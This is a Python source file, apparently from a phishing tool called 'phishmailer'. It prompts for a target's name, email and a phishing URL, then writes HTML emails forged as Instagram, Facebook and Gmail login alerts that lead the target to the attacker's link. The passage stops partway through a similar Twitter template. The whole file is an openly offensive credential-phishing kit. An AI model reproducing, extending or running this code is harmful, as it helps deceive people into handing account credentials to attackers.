import os 
import sys

from Core.helper.date import monthName
from Core.helper.color import green, white, blue, start, alert, numbering, CurrentDir

def Instagram():
	Target = input(start + " Enter Target Name: ")
	TargetAccount = input(start + " Enter Target Account Name: ")
	url = input(start + " Enter Phishing Url: ")
	TargetEmail = input(start + " Enter Target Email: ")
	
	instagram = ("""
	<div dir="ltr" style="margin: 0; padding: 0;">
	<table id="m_-7319109037895721555email_table" style="border-collapse: collapse;" border="0" width="100%;" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td id="m_-7319109037895721555email_content" style="font-family: Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif; background: #ffffff;">
	<table style="border-collapse: collapse;" width="100%" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="line-height: 20px;" colspan="3" height="20">&nbsp;</td>
	</tr>
	<tr>
	<td style="line-height: 1px;" colspan="3" height="1">&nbsp;</td>
	</tr>
	<tr>
	<td>
	<table style="border-collapse: collapse; border: solid 1px white; margin: 0 auto 5px auto; padding: 3px 0; text-align: center; width: 430px;" width="100%" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="width: 15px;" width="15px">&nbsp;</td>
	<td style="line-height: 0px; width: 400px; padding: 0 0 15px 0;">
	<table style="border-collapse: collapse;" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="width: 100%; text-align: left; height: 33px;"><img class="CToWUd" style="border: 0;" src="https://ci5.googleusercontent.com/proxy/JecDtiZNt9PEkLjyKXOHG6GQJ4ffCEmhMipCKh2K44CFFTTQUmX11SuvnJHe12oZWnvgg-vCdZYtV8qkSIKai4k6xSrxMCMtJH43fzHt1VFA6g=s0-d-e1-ft#https://static.xx.fbcdn.net/rsrc.php/v3/yr/r/jxR-EPx51R9.png" height="33" /></td>
	</tr>
	</tbody>
	</table>
	</td>
	<td style="width: 15px;" width="15px">&nbsp;</td>
	</tr>
	<tr>
	<td style="width: 15px;" width="15px">&nbsp;</td>
	<td style="border-top: solid 1px #c8c8c8;">&nbsp;</td>
	<td style="width: 15px;" width="15px">&nbsp;</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	<tr>
	<td>
	<table style="border-collapse: collapse; margin: 0 auto 0 auto;" width="430" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td>
	<table style="border-collapse: collapse; margin: 0 auto 0 auto; width: 430px;" width="430px" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="display: block; width: 15px;" width="15">&nbsp;&nbsp;&nbsp;</td>
	</tr>
	<tr>
	<td>
	<table style="border-collapse: collapse;" width="100%" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td>
	<table style="border-collapse: collapse;" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="display: block; width: 20px;" width="20">&nbsp;&nbsp;&nbsp;</td>
	<td>
	<table style="border-collapse: collapse;" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td>
	<p style="padding: 0; margin: 10px 0 10px 0; color: #565a5c; font-size: 18px;">Hi {},</p>
	<p style="padding: 0; margin: 10px 0 10px 0; color: #565a5c; font-size: 18px;">Someone tried to log in to your Instagram account {}.</p>
	<p style="padding: 0; margin: 10px 0 10px 0; color: #565a5c; font-size: 18px;">If this was you, please use the following code to log in:</p>
	<p style="padding: 0; margin: 10px 0 10px 0; color: #565a5c; font-size: 18px;"><span style="font-size: xx-large;">313013</span></p>
	<p style="padding: 0; margin: 10px 0 10px 0; color: #565a5c; font-size: 18px;">If this wasn't you, please <a style="color: #3b5998; text-decoration: none;" href="{}" target="_blank" rel="noopener">reset your password</a> to secure your account.</p>
	</td>
	</tr>
	</tbody>
	</table>
	</td>
	<td style="display: block; width: 20px;" width="20">&nbsp;&nbsp;&nbsp;</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	<tr>
	<td>
	<table style="border-collapse: collapse; margin: 0 auto 0 auto; width: 430px;" width="430px" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="line-height: 30px;" colspan="3" height="30">&nbsp;</td>
	</tr>
	<tr>
	<td style="display: block; width: 20px;" width="20">&nbsp;&nbsp;&nbsp;</td>
	<td>
	<div style="color: #abadae; font-size: 12px; margin: 0 auto 5px auto;">&copy; Instagram, Menlo Park, CA 94022</div>
	<div style="color: #abadae; font-size: 12px; margin: 0 auto 5px auto;">This message was sent to <a style="color: #abadae; text-decoration: underline;">{}</a> and intended for {}. Not your account? <a style="color: #abadae; text-decoration: underline;" target="_blank" rel="noopener">Remove your email</a> from this account.</div>
	</td>
	<td style="display: block; width: 20px;" width="20">&nbsp;&nbsp;&nbsp;</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	<tr>
	<td style="line-height: 20px;" colspan="3" height="20">&nbsp;</td>
	</tr>
	</tbody>
	</table>
	<img class="CToWUd" style="border: 0; width: 1px; height: 1px;" src="https://ci6.googleusercontent.com/proxy/f8TdjWWQZLbPuhgu8Gz1qsup6-I9BGWATWktPEUEU4u3RYuDO6deCw2HefCgsGg7hPSe_o7aRGaEmT5eWgbbwrXbav3ivvIxslWLXecN82F4_4M8H7SteqmpOyGarWOjk28YfUHllow0QTWrPMq2HuYbfF5Q4TRWM3y3=s0-d-e1-ft#https://www.facebook.com/email_open_log_pic.php?mid=HMjU0MTE4NTg0OmFwaXpwdWRpbjk2QGdtYWlsLmNvbToxNTg3" /></td>
	</tr>
	</tbody>
	</table>
	</div>""".format(Target, TargetAccount, url, Target, TargetEmail))
	
	filename = input(start + " Enter Name On HTML File To Save: ")
	Html_file = open(filename + ".html","w")
	Html_file.write(instagram)
	Html_file.close()
	print(alert + " HTML File Created")
	CurrentDir()
	
def Facebook():
	Target = input(start + " Enter Target Name: " + white)
	TargetEmail = input(start + " Enter Target Email: " + white)
	phishURL = input(start + " Enter Phishing URL: " + white)
	Date = int(input(start + " Enter a number as date: " + white))
	
	print("")
	print(start + green + "Enter Month When Login Happend")
	print(green + "[" + white + "1" + green + "]" + white + " January")
	print(green + "[" + white + "2" + green + "]" + white + " February")
	print(green + "[" + white + "3" + green + "]" + white + " March")
	print(green + "[" + white + "4" + green + "]" + white + " April")
	print(green + "[" + white + "5" + green + "]" + white + " May")
	print(green + "[" + white + "6" + green + "]" + white + " June")
	print(green + "[" + white + "7" + green + "]" + white + " July")
	print(green + "[" + white + "8" + green + "]" + white + " August")
	print(green + "[" + white + "9" + green + "]" + white + " September")
	print(green + "[" + white + "10" + green + "]" + white + " October")
	print(green + "[" + white + "11" + green + "]" + white + " November")
	print(green + "[" + white + "12" + green + "]" + white + " December")
	monthpick = int(input(green + "root@phishmailer/month:~ "))
	month = monthName(monthpick)
	
	print("")
	year = int(input(start + " Enter Year: "))
	timelog = input(start + " Enter Time (Example, 10:00 pm/am): ")
	city = input(start + " Enter name of city: ")
	country = input(start + " Enter Name of Country: ")

	facebook = ("""
	<html><head></head><body><div style="margin:0;padding:0" dir="ltr" bgcolor="#ffffff"><table cellspacing="0" cellpadding="0" width="100%;" id="m_-5140787778864602591email_table" border="0" style="border-collapse:collapse"><tbody><tr><td id="m_-5140787778864602591email_content" style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;background:#ffffff"><table cellspacing="0" cellpadding="0" width="100%" style="border-collapse:collapse"><tbody><tr><td height="20" style="line-height:20px" colspan="3">&nbsp;</td></tr><tr><td height="1" colspan="3" style="line-height:1px"><span style="color:#ffffff;display:none!important;font-size:1px"></span></td></tr><tr><td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td><td><table cellspacing="0" cellpadding="0" width="100%" style="border-collapse:collapse"><tbody><tr><td height="16" style="line-height:16px" colspan="3">&nbsp;</td></tr><tr><td width="32" align="left" valign="middle" style="height:32;line-height:0px"><a style="color:#3b5998;text-decoration:none" target="_blank"><img src="https://ci6.googleusercontent.com/proxy/EtxfQKU-LSNk3Cs2UEF2iTtMjX4XBhsW4wkC-6_XBZV22W3eB-S2JrRw027OocPIFPltHMAtxKA8QWOzc47CUrqu5jLKr9lWj_dvd8Dd1TZEpA=s0-d-e1-ft#https://static.xx.fbcdn.net/rsrc.php/v3/yk/r/_2faPUZhPI6.png" width="32" height="32" style="border:0" class="CToWUd"></a></td><td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td><td width="100%"><a style="color:#3b5998;text-decoration:none;font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;font-size:19px;line-height:32px" target="_blank" >Login Alert</a></td></tr><tr style="border-bottom:solid 1px #e5e5e5"><td height="16" style="line-height:16px" colspan="3">&nbsp;</td></tr></tbody></table></td><td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td></tr><tr><td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td><td><table cellspacing="0" cellpadding="0" width="100%" style="border-collapse:collapse"><tbody><tr><td height="28" style="line-height:28px">&nbsp;</td></tr><tr><td><span class="m_-5140787778864602591mb_text" style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;font-size:16px;line-height:21px;font-weight:bold;color:#141823">Hi {},</span></td></tr><tr><td height="14" style="line-height:14px">&nbsp;</td></tr><tr><td><span class="m_-5140787778864602591mb_text" style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;font-size:16px;line-height:21px;color:#141823">Your account was recently logged into from an unrecognized browser or device. Was this you?</span></td></tr><tr><td height="14" style="line-height:14px">&nbsp;</td></tr><tr><td><span style="font-size:10px;font-weight:bold;color:#777">New Login</span></td></tr><tr><td height="14" style="line-height:14px">&nbsp;</td></tr><tr><td></td></tr><tr style="border-top:solid 1px #e5e5e5"><td height="0" style="line-height:0px">&nbsp;</td></tr><tr><td height="14" style="line-height:14px">&nbsp;</td></tr><tr><td><table cellspacing="0" cellpadding="0" width="100%" align="left" class="m_-5140787778864602591ib_t" style="border-collapse:collapse;min-width:420px"><tbody><tr class="m_-5140787778864602591ib_row"><td valign="top" style="padding-right:10px;font-size:0px" class="m_-5140787778864602591ib_img"><img src="https://ci6.googleusercontent.com/proxy/DCTANTsJ1OvRNB6zZT48v37sH3JcbGz_I6HAHayvNwCn1Rob8r9MiKJ1BR-r5XeHt81lkel1D5_MiAsHRpqRfDmyzTkj2HyqQGpas_2qBbC-jg=s0-d-e1-ft#https://static.xx.fbcdn.net/rsrc.php/v3/y2/r/OUnczqecsPd.png" width="16px" height="16px" style="border:0" class="CToWUd"></td><td width="100%" valign="top" style="padding-right:10px" class="m_-5140787778864602591ib_mid"><span class="m_-5140787778864602591mb_text" style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;font-size:16px;line-height:21px;color:#141823"> {} {}, {} at {}</span></td></tr></tbody></table></td></tr><tr><td height="14" style="line-height:14px">&nbsp;</td></tr><tr><td></td></tr><tr style="border-top:solid 1px #e5e5e5"><td height="0" style="line-height:0px">&nbsp;</td></tr><tr><td height="14" style="line-height:14px">&nbsp;</td></tr><tr><td><table cellspacing="0" cellpadding="0" width="100%" align="left" class="m_-5140787778864602591ib_t" style="border-collapse:collapse;min-width:420px"><tbody><tr class="m_-5140787778864602591ib_row"><td valign="top" style="padding-right:10px;font-size:0px" class="m_-5140787778864602591ib_img"><img src="https://ci5.googleusercontent.com/proxy/QBDrjhzwIX48mu2IPh7LHsNkIiAd7lRdk76BILhcwZS9DS_KAimbh1JSh1MNokIqcjZNHvhX8is9-3t0O_8_RCsPfHnvT2X0TDGT7hbhPQOxng=s0-d-e1-ft#https://static.xx.fbcdn.net/rsrc.php/v3/yn/r/HLjP6-RaBz8.png" width="16px" height="16px" style="border:0" class="CToWUd"></td><td width="100%" valign="top" style="padding-right:10px" class="m_-5140787778864602591ib_mid"><span class="m_-5140787778864602591mb_text" style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;font-size:16px;line-height:21px;color:#141823">Near {}, {}</span></td></tr></tbody></table></td></tr><tr><td height="14" style="line-height:14px">&nbsp;</td></tr><tr><td></td></tr><tr style="border-top:solid 1px #e5e5e5"><td height="0" style="line-height:0px">&nbsp;</td></tr><tr><td height="14" style="line-height:14px">&nbsp;</td></tr><tr><td><table cellspacing="0" cellpadding="0" width="100%" align="left" class="m_-5140787778864602591ib_t" style="border-collapse:collapse;min-width:420px"><tbody><tr class="m_-5140787778864602591ib_row"><td valign="top" style="padding-right:10px;font-size:0px" class="m_-5140787778864602591ib_img"><img src="https://ci3.googleusercontent.com/proxy/6eUh9zO42iKU02o2lX-pLc3uDyVFjkGqvjU7jnDgBNwGngV7cFiIa3DPoWtXpkyXqhygmeah586FIXGGQYGa6bw_Y9xD7ltzGQwaFLbzznqHzA=s0-d-e1-ft#https://static.xx.fbcdn.net/rsrc.php/v3/yH/r/FOZusRNk18E.png" width="16px" height="16px" style="border:0" class="CToWUd"></td><td width="100%" valign="top" style="padding-right:10px" class="m_-5140787778864602591ib_mid"><span class="m_-5140787778864602591mb_text" style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;font-size:16px;line-height:21px;color:#141823">Google Chrome</span></td></tr></tbody></table></td></tr><tr><td height="14" style="line-height:14px">&nbsp;</td></tr></tbody></table></td><td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td></tr><tr><td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td><td><table cellspacing="0" cellpadding="0" width="100%" style="border-collapse:collapse"><tbody><tr><td height="2" style="line-height:2px" colspan="3">&nbsp;</td></tr><tr><td class="m_-5140787778864602591mb_blk"><a href="{}" style="color:#3b5998;text-decoration:none" target="_blank"><table cellspacing="0" cellpadding="0" width="100%" style="border-collapse:collapse"><tbody><tr><td style="border-collapse:collapse;border-radius:2px;text-align:center;display:block;border:solid 1px #344c80;background:#4c649b;padding:7px 16px 11px 16px"><a href="{}" style="color:#3b5998;text-decoration:none;display:block" target="_blank"><center><font size="3"><span style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;white-space:nowrap;font-weight:bold;vertical-align:middle;color:#ffffff;font-size:14px;line-height:14px">Review&nbsp;Login</span></font></center></a></td></tr></tbody></table></a></td><td width="10" style="display:block;width:10px" class="m_-5140787778864602591mb_hide">&nbsp;&nbsp;&nbsp;</td><td class="m_-5140787778864602591mb_blk"><a href="{}" style="color:#3b5998;text-decoration:none" target="_blank"><table cellspacing="0" cellpadding="0" width="100%" style="border-collapse:collapse"><tbody><tr><td style="border-collapse:collapse;border-radius:2px;text-align:center;display:block;border:solid 1px #c9ccd1;background:#f6f7f8;padding:7px 16px 11px 16px"><a href="{}" style="color:#3b5998;text-decoration:none;display:block" target="_blank"><center><font size="3"><span style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;white-space:nowrap;font-weight:bold;vertical-align:middle;color:#525252;font-size:14px;line-height:14px">Manage&nbsp;Alerts</span></font></center></a></td></tr></tbody></table></a></td><td width="100%" class="m_-5140787778864602591mb_hide"></td></tr><tr><td height="32" style="line-height:32px" colspan="3">&nbsp;</td></tr></tbody></table></td><td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td></tr><tr><td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td><td><table cellspacing="0" cellpadding="0" width="100%" style="border-collapse:collapse"><tbody><tr style="border-top:solid 1px #e5e5e5"><td height="16" style="line-height:16px">&nbsp;</td></tr><tr><td style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;font-size:11px;color:#aaaaaa;line-height:16px">This message was sent to <a href="" style="color:#3b5998;text-decoration:none" target="_blank">{}/a>. If you don't want to receive these emails from Facebook in the future, please <a href="" style="color:#3b5998;text-decoration:none" target="_blank" data-saferedirecturl="#link11">unsubscribe</a>.<br>Facebook, Inc., Attention: Community Support, 1 Hacker Way, Menlo Park, CA 94025</td></tr></tbody></table></td><td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td></tr><tr><td height="20" style="line-height:20px" colspan="3">&nbsp;</td></tr></tbody></table><span><img src="https://ci5.googleusercontent.com/proxy/HW2B-_UGsdk69Jyhg1T6TPoP85hYe1BMFUnXG1tzXLvolAUwH6t0YiIo4qp5aCDfKneX2WoPW8rAE0T34kLDIX0mSXZNOiQuEaPUHdAvImAazBZauNI1_PSndHlRvKy951jvWI5bsvfOh2oBJC7IqpAoyZXzYQ=s0-d-e1-ft#https://www.facebook.com/email_open_log_pic.php?mid=5464d188693c7G5af398d232efG5464d621c9699G2bf" style="border:0;width:1px;height:1px" class="CToWUd"></span></td></tr></tbody></table></div></div></div> </div></div></div></div></div></div></div></div></body></html>
	""".format(Target, month, Date, year, timelog, city, country,phishURL, phishURL, phishURL, phishURL, TargetEmail))
	
	print("")
	filename = input(start + " Enter Name On HTML File To Save: ")
	Html_file = open(filename + ".html","w")
	Html_file.write(facebook)
	Html_file.close()
	print(alert + " HTML File Created")
	
def Gmail():
	Target = input(start + " Enter Target Name: " + white)
	TargetEmail = input(start + " Enter Target Email: " + white)
	Day = input(start + " Enter Day ex.Monday: " + white)
	Date = input(start + " Enter Date: " + white)
	Year = input(start + " Enter Year: " + white)
	Time = input(start + " Enter Time (Example, 10:00 pm/am): " + white)
	
	print("")
	print(start + "Enter Month When Login Happend")
	print(numbering(1) + white + " January")
	print(numbering(2) + white + " February")
	print(numbering(3) + white + " March")
	print(numbering(4) + white + " April")
	print(numbering(5) + white + " May")
	print(numbering(6) + white + " June")
	print(numbering(7) + white + " July")
	print(numbering(8) + white + " August")
	print(numbering(9) + white + " September")
	print(numbering(10) + white + " October")
	print(numbering(11) + white + " November")
	print(numbering(12) + white + " December")
	monthpick = int(input(green + "root@phishmailer:~ " + white))
	
	print("")
	Country = input(start + " Enter Country: " + white)
	City = input(start + " Enter A City: " + white)
	PhishUrl = input(start + " Enter A Phishing Url: " + white)
	month = monthName(monthpick)

	Gmail = ("""<table style="min-width: 348px; width: 100%; height: 100%;" border="0" cellspacing="0" cellpadding="0">
	<tbody>
	<tr align="center">
	<td width="32px">&nbsp;</td>
	<td>
	<table style="max-width: 600px;" border="0" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td>
	<table style="width: 100%;" border="0" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td align="left"><img class="CToWUd" style="display: block; width: 92px; height: 32px;" src="https://ci3.googleusercontent.com/proxy/EURRrDHt1LcCbHcRdDtMHOQPPMHe5FkDsMAHs66gxAIYzYD38Abpa1Fmy-ACuq2V1tI8GZdWA4FLsXjKM4iAD-CixwUocANswARkdK1ttXK-T1DDSfiUplKFys37dkM=s0-d-e1-ft#https://www.gstatic.com/accountalerts/email/googlelogo_color_188x64dp.png" alt="" width="92" height="32" /></td>
	<td align="right"><img class="CToWUd" style="display: block; width: 32px; height: 32px;" src="https://ci6.googleusercontent.com/proxy/w8ACgsIEmhjGKodu731Z-VOiYfmXsRM4zd6F_w4_cKQ1JPXF_6Y_hEPR_iJKee33yGZ8zR6o_Q08vuYMKmetfyoGNtMpt1d5CU6z3xA=s0-d-e1-ft#https://www.gstatic.com/accountalerts/email/keyhole.png" alt="" width="32" height="32" /></td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	<tr>
	<td>
	<table style="min-width: 332px; max-width: 600px; border-width: 1px 1px 0px; border-image: initial; border-top-left-radius: 3px; border-top-right-radius: 3px; width: 100%; border-color: #e0e0e0 #e0e0e0 initial #e0e0e0; border-style: solid solid initial solid;" border="0" cellspacing="0" cellpadding="0" bgcolor="#4184F3">
	<tbody>
	<tr>
	<td colspan="3" height="72px">&nbsp;</td>
	</tr>
	<tr>
	<td width="32px">&nbsp;</td>
	<td style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 24px; color: #ffffff; line-height: 1.25;">New <span class="il">sign</span>-in from Chrome on Windows</td>
	<td width="32px">&nbsp;</td>
	</tr>
	<tr>
	<td colspan="3" height="18px">&nbsp;</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	<tr>
	<td>
	<table style="min-width: 332px; max-width: 600px; border-width: 0px 1px 1px; border-image: initial; border-bottom-left-radius: 3px; border-bottom-right-radius: 3px; width: 100%; border-color: initial #f0f0f0 #c0c0c0 #f0f0f0; border-style: initial solid solid solid;" border="0" cellspacing="0" cellpadding="0" bgcolor="#FAFAFA">
	<tbody>
	<tr>
	<td rowspan="3" width="32px">&nbsp;</td>
	<td>&nbsp;</td>
	<td rowspan="3" width="32px">&nbsp;</td>
	</tr>
	<tr>
	<td>
	<table style="min-width: 300px;" border="0" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 13px; color: #202120; line-height: 1.5;">Hi {},</td>
	</tr>
	<tr>
	<td style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 13px; color: #202120; line-height: 1.5;">Your Google Account <a>{}</a> was just used to <span class="il">sign</span> in from <span style="white-space: nowrap;">Chrome</span> on <span style="white-space: nowrap;">Windows</span>.
	<table style="margin-top: 48px; margin-bottom: 48px;" border="0" cellspacing="0" cellpadding="0">
	<tbody>
	<tr valign="middle">
	<td width="32px">&nbsp;</td>
	<td align="center"><img class="CToWUd" style="width: 48px; height: 48px; display: block; border-radius: 50%;" src="https://lh3.googleusercontent.com/-bQZ5NhEHURU/WL5aUNfXA1I/AAAAAAAAAA4/gTy3xQfIhFEyPcxScplho8gYxNp1xC3lwCEw/w140-h140-p/34AD2.jpg" alt="" width="48px" height="48px" /></td>
	<td width="16px">&nbsp;</td>
	<td style="line-height: 1.2;"><span style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 20px; color: #202120;">{}</span><br /><span style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 13px; color: #727272;"><a>{}</a></span></td>
	</tr>
	<tr valign="middle">
	<td width="32px" height="24px">&nbsp;</td>
	<td align="center" height="24px"><img class="CToWUd" style="width: 4px; height: 10px; display: block;" src="https://ci4.googleusercontent.com/proxy/3v5djkrQw0eYYuEXwiOUoxXYc3R6bFSVEFNL0C3YbDgAYCp7sUIL4fxyDZ8RADuKX3gZ4_z6bAmrACIqNYpHa95AfUrSskjfkEf4nDXRH7A=s0-d-e1-ft#https://www.gstatic.com/accountalerts/email/down_arrow.png" alt="" width="4px" height="10px" /></td>
	</tr>
	<tr valign="top">
	<td width="32px">&nbsp;</td>
	<td align="center"><img class="CToWUd" style="width: 48px; height: 48px; display: block;" src="https://ci6.googleusercontent.com/proxy/8-TvqI07V6c6EfMmOpioytN1akb1_MYoQR5JjP9FrOcBKg-A1ob9_8rI-og2hhemR-SKt-PTzEc8LHrxdtQOnK5WmXqFWq16_l4IuCD9uPzGQipSyU_VqCQpBegNZjcIuYnKtg=s0-d-e1-ft#https://www.gstatic.com/accountalerts/devices/windows_laptop_wallpaper_big.png" alt="" width="48px" height="48px" /></td>
	<td width="16px">&nbsp;</td>
	<td style="line-height: 1.2;"><span style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 16px; color: #202120;">Windows</span><br /><span style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 13px; color: #727272;">{}, {} {}, {} {}<br /> {}, {}<br />Chrome</span></td>
	</tr>
	</tbody>
	</table>
	<strong>Don't recognize this activity?</strong><br />Review your <a style="text-decoration: none; color: #4285f4;" href="{}" target="_blank" rel="noopener">recently used devices</a> now.<br /><br />Why are we sending this? We take security very seriously and we want to keep you in the loop on important actions in your account.<br />We were unable to determine whether you have used this browser or device with your account before. This can happen when you <span class="il">sign</span> in for the first time on a new computer, phone or browser, when you use your browser's incognito or private browsing mode or clear your cookies, or when somebody else is accessing your account.</td>
	</tr>
	<tr>
	<td style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 13px; color: #202120; line-height: 1.5;">Best,<br />The Google Accounts team</td>
	</tr>
	<tr>
	<td>
	<table style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 12px; color: #b9b9b9; line-height: 1.5;">
	<tbody>
	<tr>
	<td>*The location is approximate and determined by the IP address it was coming from.</td>
	</tr>
	<tr>
	<td>This email can't receive replies. To give us feedback on this alert, <a style="text-decoration: none; color: #4285f4;" href="{}" target="_blank" rel="noopener">click here</a>.<br />For more information, visit the <a style="text-decoration: none; color: #4285f4;" href="{}" target="_blank" rel="noopener">Google Accounts Help Center</a>.</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	<tr>
	<td style="max-width: 600px; font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 10px; color: #bcbcbc; line-height: 1.5;">&nbsp;</td>
	</tr>
	<tr>
	<td>
	<table style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 10px; color: #666666; line-height: 18px; padding-bottom: 10px;">
	<tbody>
	<tr>
	<td>You received this mandatory email service announcement to update you about important changes to your Google product or account.</td>
	</tr>
	<tr>
	<td>
	<div style="direction: ltr; text-align: left;">&copy; {} Google Inc., 1600 Amphitheatre Parkway, Mountain View, CA 94043, USA</div>
	</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	</tbody>
	</table>
	</td>
	<td width="32px">&nbsp;</td>
	</tr>
	</tbody>
	</table>
	<p><br /><br /></p>""".format(Target, TargetEmail, Target, TargetEmail, Day, month, Date, Year, Time, City, Country, PhishUrl, PhishUrl, PhishUrl, Year))
	
	filename = input(start + " Enter Name On HTML File To Save: ")
	Html_file = open(filename + ".html","w")
	Html_file.write(Gmail)
	Html_file.close()
	print(alert + " HTML File Created")

def Twitter():
	AccountName = input(start + " Enter Username: ")
	TargetName = input(start + " Enter Target Name: ")
	City = input(start + " Enter City: ")
	Country = input(start + " Enter Country: ")
	PhishUrl = input(start + " Enter Phishing Url: ") 
	MustContain = input(start + " Your Url Contains (Word In Domain): ")
	Extension = input(start + " Your Enter Your Domain (Example '.com'): ")
	twitter = ("""<div bgcolor="#F5F8FA" style="margin:0;padding:0"><table cellpadding="0" cellspacing="0" border="0" width="100%" bgcolor="#F5F8FA" style="background-color:#f5f8fa;padding:0;margin:0;line-height:1px;font-size:1px" class="m_7210276772504823937body_wrapper"><tbody><tr><td align="center" style="padding:0;margin:0;line-height:1px;font-size:1px"><table class="m_7210276772504823937collapse" id="m_7210276772504823937header" align="center" width="448" style="width:448px;padding:0;margin:0;line-height:1px;font-size:1px" bgcolor="#ffffff" cellpadding="0" cellspacing="0" border="0"><tbody><tr><td style="min-width:448px;padding:0;margin:0;line-height:1px;font-size:1px" class="m_7210276772504823937cut"> <img src="https://ci5.googleusercontent.com/proxy/dZihfURYMr4ltOGMmSu7g3JXn4x0ue5ctCYAEwZ-rv1Lx8G77mg5v7CCPyDYzWr4uj2cpj6-5f0-LRFTlHdmZ14PL7dREA1lSKWeXxIwyQjf9Bdb1yJ3JcrK=s0-d-e1-ft#https://ea.twimg.com/email/self_serve/media/spacer-1402696023930.png" style="min-width:448px;height:1px;margin:0;padding:0;display:block;border:none;outline:none" class="CToWUd"> </td></tr></tbody></table> </td></tr><tr><td align="center" style="padding:0;margin:0;line-height:1px;font-size:1px"><table class="m_7210276772504823937collapse" id="m_7210276772504823937header" align="center" width="448" style="width:448px;background-color:#ffffff;padding:0;margin:0;line-height:1px;font-size:1px" bgcolor="#ffffff" cellpadding="0" cellspacing="0" border="0"><tbody><tr><td colspan="3" height="24" style="height:24px;padding:0;margin:0;line-height:1px;font-size:1px" class="m_7210276772504823937logo_space"> &nbsp; </td></tr><tr align="right"><td width="24" class="m_7210276772504823937margin" style="padding:0;margin:0;line-height:1px;font-size:1px"></td><td align="right" style="padding:0;margin:0;line-height:1px;font-size:1px"> <a href="#m_7210276772504823937_" style="text-decoration:none;border-style:none;border:0;padding:0;margin:0"> <img width="32" align="right" src="https://ci6.googleusercontent.com/proxy/7uJiuTOo6rMk0ahEnEhjXzhKVdtkt-IgM_uCWBYJd8SjMK2uFYPnfc9tFTdYP-OAHBQWBjjS-gNGUpaW67od9X37iuyFD32VfvDGDyXB1DDj-o0HyZXQdxkFn8uPO3ydU9rPwA=s0-d-e1-ft#https://ea.twimg.com/email/self_serve/media/Twitter_logo_180-1468901451975.png" style="width:32px;margin:0;padding:0;display:block;border:none;outline:none" class="CToWUd"> </a> </td><td width="24" class="m_7210276772504823937margin" style="padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td colspan="4" height="24" style="height:24px;padding:0;margin:0;line-height:1px;font-size:1px" class="m_7210276772504823937logo_space"> <img width="1" height="1" style="display:block;margin:0;padding:0;display:block;border:none;outline:none" src="https://ci6.googleusercontent.com/proxy/DcPlfaEWAKqTloO57NjmsI2d7aQm9ZJE7V1xVBepiu2RDkg2ScBv6cld0fmGgPGWqlUp2IghtFNnNIr7ap2zdki9k3RW8ftVByQdeahXNIPYHI4WNspFWCV3oCaqQlH8XsU7lG9hTHrZwYJZ_LgibzX_SE10SkLb7KMvaZDd-zrTpRqBQTwZKEa8ZknEgYHIZdakbg=s0-d-e1-ft#https://twitter.com/scribe/ibis?t=1&amp;cn=bG9naW5fbm90aWZpY2F0aW9u&amp;iid=d245d496e25743259b05c4aeaf0b44cf&amp;uid=2356568077&amp;nid=244+20" class="CToWUd"> </td></tr></tbody></table><table class="m_7210276772504823937collapse" 